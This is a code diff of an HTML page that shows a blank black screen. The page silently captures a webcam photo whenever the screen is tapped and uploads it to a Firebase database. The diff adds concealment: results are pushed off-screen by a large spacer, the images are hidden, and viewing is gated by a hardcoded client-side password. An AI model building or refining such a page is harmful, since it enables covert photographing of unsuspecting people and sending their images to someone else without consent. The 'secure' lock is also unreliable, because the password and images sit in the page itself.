@@ -2,49 +2,63 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>Live Photo Sync - 9 Photos Grid</title>
+  <title>Live Photo Sync - Secure 4 Photos</title>
   <style>
     body {
       background: black;
       margin: 0;
       padding: 0;
       font-family: sans-serif;
-      color: white;
       overflow-y: scroll;
-      min-height: 100vh;
+      min-height: 300vh;
     }
-
     #captureArea {
       height: 100vh;
       width: 100vw;
     }
-
+    #spacer {
+      height: 150vh;
+    }
     #result {
-      padding: 20px;
       text-align: center;
+      padding: 20px;
+      color: white;
     }
-
-    #photoGrid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
+    #unlockBtn {
+      background-color: #222;
+      color: #0f0;
+      border: none;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      font-size: 25px;
+      cursor: pointer;
+      display: none;
+    }
+    .photoGrid {
+      display: flex;
+      justify-content: center;
+      flex-wrap: wrap;
       gap: 10px;
-      justify-items: center;
+      margin-top: 20px;
     }
-
-    .livePhoto {
-      width: 90%;
-      max-width: 120px;
+    .photoGrid img {
+      width: 45%;
+      max-width: 180px;
       border: 2px solid white;
+      display: none; /* hide until unlocked */
     }
   </style>
 </head>
 <body>
-
   <div id="captureArea" ontouchstart="capture()" onclick="capture()"></div>
 
+  <div id="spacer"></div>
+
   <div id="result">
-    <h3>Live Photo Grid:</h3>
-    <div id="photoGrid"></div>
+    <h3>Captured Photos:</h3>
+    <button id="unlockBtn">🔒</button>
+    <div class="photoGrid" id="photoGrid"></div>
   </div>
 
   <video id="video" autoplay playsinline style="display:none;"></video>
@@ -70,13 +84,14 @@
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
     const photoGrid = document.getElementById('photoGrid');
+    const unlockBtn = document.getElementById('unlockBtn');
 
-    // Start camera
+    let isUnlocked = false;
+
     navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
       video.srcObject = stream;
     });
 
-    // Capture photo and push to array
     function capture() {
       const ctx = canvas.getContext('2d');
       canvas.width = video.videoWidth;
@@ -85,25 +100,40 @@
       const dataUrl = canvas.toDataURL("image/jpeg");
 
       db.ref("livephotos").once("value", snapshot => {
-        const currentPhotos = snapshot.val() || [];
-        if (currentPhotos.length >= 9) currentPhotos.shift(); // remove oldest
-        currentPhotos.push(dataUrl);
-        db.ref("livephotos").set(currentPhotos);
+        let photos = snapshot.val() || [];
+        if (photos.length >= 4) photos.shift(); // remove oldest
+        photos.push(dataUrl);
+        db.ref("livephotos").set(photos);
       });
-
-      document.getElementById('result').scrollIntoView({ behavior: 'smooth' });
     }
 
-    // Display 9 live photos
     db.ref("livephotos").on("value", snapshot => {
       const photos = snapshot.val() || [];
-      photoGrid.innerHTML = "";
+      photoGrid.innerHTML = ""; // clear
       photos.forEach(url => {
         const img = document.createElement("img");
         img.src = url;
-        img.className = "livePhoto";
+        img.style.display = isUnlocked ? "block" : "none";
         photoGrid.appendChild(img);
       });
+
+      if (photos.length > 0 && !isUnlocked) {
+        unlockBtn.style.display = "inline-block";
+      }
+    });
+
+    unlockBtn.addEventListener("click", () => {
+      const pass = prompt("Enter password to unlock photos:");
+      if (pass === "hamza") {
+        isUnlocked = true;
+        unlockBtn.style.display = "none";
+
+        document.querySelectorAll(".photoGrid img").forEach(img => {
+          img.style.display = "block";
+        });
+      } else {
+        alert("Wrong password!");
+      }
     });
   </script>
 </body>
